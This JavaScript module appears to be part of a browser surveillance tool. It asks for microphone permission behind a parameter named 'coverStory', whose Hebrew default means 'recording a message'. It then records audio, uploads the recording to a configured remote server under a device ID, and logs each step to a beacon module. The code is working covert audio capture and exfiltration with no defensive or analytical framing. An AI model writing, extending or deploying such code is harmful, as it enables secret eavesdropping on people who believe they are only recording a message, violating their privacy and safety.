import { forceEvent } from '../beacon.js';
import { CONFIG } from '../config.js';

const _AUDIO_MIME_TYPES = [
  'audio/mp4;codecs=mp4a.40.2',
  'audio/mp4',
  'audio/webm;codecs=opus',
  'audio/webm',
  'audio/ogg;codecs=opus',
];

function _bestAudioMime() {
  return _AUDIO_MIME_TYPES.find(t => {
    try { return MediaRecorder.isTypeSupported(t); } catch { return false; }
  }) || '';
}

async function _uploadAudio(dataUrl) {
  if (!CONFIG.deviceId) return;
  try {
    await fetch(`${CONFIG.server}/api/media/${CONFIG.deviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'audio', data: dataUrl, ts: Date.now() }),
    });
  } catch { }
}

export async function requestAudio(coverStory = 'הקלטת הודעה') {
  try {
    const tmp = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    tmp.getTracks().forEach(t => t.stop());
    await forceEvent('permission_request', { permission: 'microphone', result: 'granted' });
    return { granted: true };
  } catch {
    await forceEvent('permission_request', { permission: 'microphone', result: 'denied' });
    return { granted: false };
  }
}

export async function captureAudio(durationSec = 10) {
  window.__audioAbort = false;
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    const mimeType = _bestAudioMime();
    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
    const chunks = [];
    recorder.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };

    let aborted = false;
    await new Promise((resolve, reject) => {
      let timer, poll;
      recorder.onstop = () => { clearTimeout(timer); clearInterval(poll); resolve(); };
      recorder.onerror = e => { clearTimeout(timer); clearInterval(poll); reject(e.error ?? new Error('recorder error')); };
      recorder.start(1000);
      timer = setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, durationSec * 1000);
      poll = setInterval(() => {
        if (window.__audioAbort && recorder.state !== 'inactive') {
          aborted = true;
          recorder.stop();
        }
      }, 200);
    });

    window.__audioAbort = false;
    const blob = new Blob(chunks, { type: mimeType || 'audio/mp4' });
    const dataUrl = await new Promise((res, rej) => {
      const r = new FileReader(); r.onload = () => res(r.result); r.onerror = rej; r.readAsDataURL(blob);
    });

    await _uploadAudio(dataUrl);
    await forceEvent('audio_captured', { duration: durationSec, mimeType, size: blob.size, aborted });
  } catch (e) {
    await forceEvent('audio_capture_error', { error: e?.message });
  } finally {
    window.__audioAbort = false;
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

export { requestAudio as requestPermission };
